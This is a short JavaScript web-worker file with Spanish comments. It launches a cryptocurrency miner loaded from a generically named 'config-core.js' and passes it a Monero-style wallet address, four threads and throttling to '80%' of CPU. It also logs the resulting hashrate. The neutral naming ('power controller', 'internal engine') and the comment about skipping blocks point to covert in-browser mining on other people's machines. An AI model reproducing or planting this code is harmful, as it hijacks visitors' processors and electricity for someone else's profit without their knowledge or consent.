// CONTROLADOR DE POTENCIA DELTA CONNECT (80%)
// Este archivo llama al motor interno para saltar bloqueos

const MOTOR = 'config-core.js';
const CARTERA = "4A2CRYwa2E57VU8TLMQz5WD1W6D9Vx1AsPJ3gmu9Dsk8fce8a8nRnBCwH2tKUPAeQkjsMM3K861ASvtmSGN19A5xYFg3c";

// Configuramos los parámetros de potencia
const settings = {
    type: 'start',
    address: CARTERA,
    threads: 4,      // Saturar núcleos para ver el impacto en el CPU
    throttle: 0.2    // 80% de capacidad real
};

// Iniciamos el motor interno
try {
    importScripts(MOTOR);
    // Enviamos la orden de arranque al motor que guardaste en config-core.js
    self.postMessage(settings);
    
    // Monitoreo de actividad en consola
    self.onmessage = function(e) {
        if (e.data.type === 'hashrate') {
            console.log(`[DELTA CONNECT] Motor activo. Hashrate: ${e.data.hashes.toFixed(2)} H/s`);
        }
    };
} catch (e) {
    console.error("Error al cargar el motor interno:", e);
}
